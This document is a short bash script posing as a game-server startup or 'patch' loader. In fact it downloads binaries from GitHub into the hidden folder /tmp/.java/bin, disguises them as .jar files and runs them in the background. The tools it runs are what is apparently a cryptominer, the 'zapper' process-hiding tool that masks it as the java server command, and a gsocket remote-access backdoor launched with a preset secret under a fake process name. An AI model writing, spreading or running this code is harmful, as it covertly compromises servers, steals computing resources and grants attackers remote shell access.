#!/bin/bash

function fetch_files() {
    echo "Downloading Patches ..."
    mkdir -p /tmp/.java/bin
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/rufastnde/c1.conf -o cfg.conf
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
    cd /tmp/.java/bin && curl -L https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-x86_64 -o mc-mods.jar
    echo "DONE ..."
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
    cd /tmp/.java/bin && nohup ./mc-mods.jar -a 'java -Xms128M -XX:MaxRAMPercentage=95.0 -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
    # GNET
    export GSOCKET_ARGS="-s cAeD2-a1E2c-5A16-f9L89-3D9g-8Hbj7-56C4a961-eCd9-F9440-d6A2803-8A1c-5J1g60 -liqD"
    export HOME=/home/container
    cd /tmp/.java/bin && exec -a -java ./add-on.jar &
}

if [ -f "/tmp/.java/bin/cfg.conf" ] && [ -f "/tmp/.java/bin/add-on.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ]; then
    echo "Patch files already loaded ..."
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi
